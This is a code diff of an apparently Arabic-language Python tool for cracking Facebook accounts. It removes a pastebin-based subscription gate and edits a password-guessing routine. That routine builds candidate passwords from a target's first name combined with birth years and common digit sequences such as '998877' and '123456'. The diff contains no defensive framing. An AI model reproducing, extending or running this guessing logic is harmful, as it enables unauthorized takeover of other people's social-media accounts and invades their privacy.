@@ -12,31 +12,6 @@ import requests,bs4,json,os,sys,random,datetime,time,re
 import webbrowser
 webbrowser.open('https://www.facebook.com/profile.php?id=100052089186869')
 import os
-
-def haniID():
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "-".join(uuid)
-  print("\x1b[37;1mYOUR ID : "+id)
-  try:
-    httpCaht = requests.get("https://pastebin.com/raw/5bD2wL8Q").text
-    if id in httpCaht:
-      print('')
-      print("\033[1;92m ✔️✔️...!")
-      msg = str(os.geteuid())
-      time.sleep(0.3)
-      pass
-    else:
-      print('')
-      print("\033[1;33mللاشتراك بالاداه راسل كونان @KO00NAN")
-      
-      time.sleep(1)
-      sys.exit()
-  except:
-    
-    
-    haniID()
-haniID()
-print('كفوو كونان وافق انك تشغل اداتو ')
 firasid=[]
 import urllib3,rich,base64
 from rich.table import Table as me
@@ -684,6 +659,7 @@ def passwrd():
                     pwv.append('009988')
                     pwv.append('99887766')
                     pwv.append('998877')
+                    pwv.append('١٢٣٤٥٦')
                     pwv.append('19901990')
                     pwv.append('19911991')
                     pwv.append('19921992')
@@ -698,10 +674,6 @@ def passwrd():
                     pwv.append(frs+'1993')
                     pwv.append(frs+'1994')
                     pwv.append(frs+'1995')
-                    pwv.append(frs+'1996')
-                    pwv.append(frs+'1997')
-                    pwv.append(frs+'1998')
-                    pwv.append(frs+'1999')
                     
             elif len(frs) < 3:
                 pwv.append(nmf)
@@ -718,6 +690,7 @@ def passwrd():
                 pwv.append('009988')
                 pwv.append('99887766')
                 pwv.append('998877')
+                pwv.append('١٢٣٤٥٦')
                 pwv.append('19901990')
                 pwv.append('19911991')
                 pwv.append('19921992')
@@ -732,10 +705,6 @@ def passwrd():
                 pwv.append(frs+'1993')
                 pwv.append(frs+'1994')
                 pwv.append(frs+'1995')
-                pwv.append(frs+'1996')
-                pwv.append(frs+'1997')
-                pwv.append(frs+'1998')
-                pwv.append(frs+'1999')
                 
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
